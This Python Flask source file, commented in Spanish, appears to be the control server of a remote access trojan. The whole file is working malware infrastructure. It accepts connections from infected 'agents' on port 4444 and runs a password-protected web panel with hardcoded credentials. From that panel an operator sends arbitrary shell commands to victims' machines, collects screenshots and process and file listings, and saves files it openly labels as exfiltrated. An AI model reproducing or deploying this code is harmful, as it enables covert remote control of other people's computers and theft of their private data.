from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_from_directory
import socket
import threading
import os
from functools import wraps

app = Flask(__name__)

# --- CONFIGURACIÓN DE SEGURIDAD ---
app.secret_key = 'clave_maestra_super_secreta_2026' 
USER_ADMIN = "admin"
PASS_ADMIN = "pwned2026"

# Diccionario global para agentes y un Lock para evitar colisiones entre hilos
agentes = {}
agentes_lock = threading.Lock()

# --- DECORADOR: LOGIN REQUERIDO ---
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

# --- SERVIDOR DE RED (SOCKETS) ---
def escuchar_agentes():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", 4444))
    server.listen(20)
    print("[*] Servidor de Red: Esperando agentes en el puerto 4444...")
    
    while True:
        try:
            conn, addr = server.accept()
            conn.settimeout(10) 
            
            # Recibimos Hostname|User
            identidad = conn.recv(1024).decode('cp850', errors='replace')
            
            if "|" in identidad:
                pc_name, user_name = identidad.split("|")
            else:
                pc_name, user_name = "Desconocido", "Desconocido"

            with agentes_lock:
                id_agente = len(agentes)
                agentes[id_agente] = {
                    "socket": conn, 
                    "addr": addr, 
                    "pc": pc_name,
                    "user": user_name,
                    "res": "Agente conectado y listo."
                }
            print(f"[+] NUEVO AGENTE [{id_agente}]: {pc_name}\\{user_name} ({addr[0]})")
            
        except Exception as e:
            print(f"[-] Error aceptando conexión: {e}")

# --- RUTAS DE FLASK ---

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        if request.form['username'] != USER_ADMIN or request.form['password'] != PASS_ADMIN:
            error = 'Acceso denegado.'
        else:
            session['logged_in'] = True
            return redirect(url_for('index'))
    return render_template('login.html', error=error)

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/')
@login_required
def index():
    return render_template('index.html')

@app.route('/screenshots/<path:filename>')
@login_required
def get_screenshot(filename):
    return send_from_directory('downloads', filename)

@app.route('/ejecutar', methods=['POST'])
@login_required
def ejecutar():
    try:
        id_target = int(request.form.get('id'))
        comando = request.form.get('comando')
        
        with agentes_lock:
            if id_target not in agentes:
                return jsonify({"status": "error", "resultado": "Agente no encontrado"})
            conn = agentes[id_target]["socket"]

        # Enviamos comando al agente
        conn.send(comando.encode())
        
        # Recibimos respuesta (1MB buffer)
        respuesta_raw = conn.recv(1024 * 1024) 
        
        res_final = ""

        # 1. TRATAMIENTO DE EXFILTRACIÓN (Screenshots / Descargas)
        if respuesta_raw.startswith(b"FILE_SIZE:"):
            header_full = respuesta_raw.decode('ascii', errors='ignore')
            size_str = "".join([c for c in header_full.split(":")[1] if c.isdigit()])
            size = int(size_str)
            
            header_len = header_full.find(size_str) + len(size_str)
            datos_acumulados = respuesta_raw[header_len:]
            
            # Recibir datos restantes si el archivo es grande
            while len(datos_acumulados) < size:
                chunk = conn.recv(8192)
                if not chunk: break
                datos_acumulados += chunk
            
            if not os.path.exists('downloads'): os.makedirs('downloads')

            # LÓGICA DE NOMBRES INTELIGENTE
            if "screenshot" in comando:
                nombre_archivo = f"screen_{id_target}.jpg"
            else:
                # Extraemos el nombre original de la ruta enviada
                # Ej: "download C:\Users\secreto.txt" -> "secreto.txt"
                nombre_original = comando.split(" ")[-1].split("\\")[-1]
                nombre_archivo = f"agent{id_target}_{nombre_original}"
            
            ruta_final = os.path.join('downloads', nombre_archivo)
            
            with open(ruta_final, "wb") as f:
                f.write(datos_acumulados[:size])
            
            res_final = f"ÉXITO: Archivo exfiltrado como {nombre_archivo}"

        # 2. TRATAMIENTO DE LISTAS (Procesos / Archivos)
        elif b"--- PROCESOS ---" in respuesta_raw or b"--- FILES ---" in respuesta_raw:
            text = respuesta_raw.decode('cp850', errors='replace')
            # Limpiamos etiquetas y convertimos pipes en saltos de línea
            res_final = text.replace("--- PROCESOS ---\n", "").replace("--- FILES ---\n", "").replace("|", "\n")

        # 3. COMANDOS DE SHELL / RCE
        else:
            res_final = respuesta_raw.decode('cp850', errors='replace')

        with agentes_lock:
            agentes[id_target]["res"] = res_final

        return jsonify({"status": "success", "resultado": res_final})

    except socket.timeout:
        return jsonify({"status": "error", "resultado": "TIMEOUT: Agente fuera de línea o lento."})
    except Exception as e:
        return jsonify({"status": "error", "resultado": f"Error: {str(e)}"})

@app.route('/api/agentes')
@login_required
def api_agentes():
    datos = []
    with agentes_lock:
        for id_agente, info in agentes.items():
            datos.append({
                "id": id_agente,
                "ip": info["addr"][0],
                "pc": info.get("pc", "N/A"),
                "user": info.get("user", "N/A"),
                "resultado": info["res"]
            })
    return jsonify(datos)

if __name__ == '__main__':
    if not os.path.exists('downloads'): os.makedirs('downloads')
    threading.Thread(target=escuchar_agentes, daemon=True).start()
    app.run(host='0.0.0.0', port=5000, debug=False)
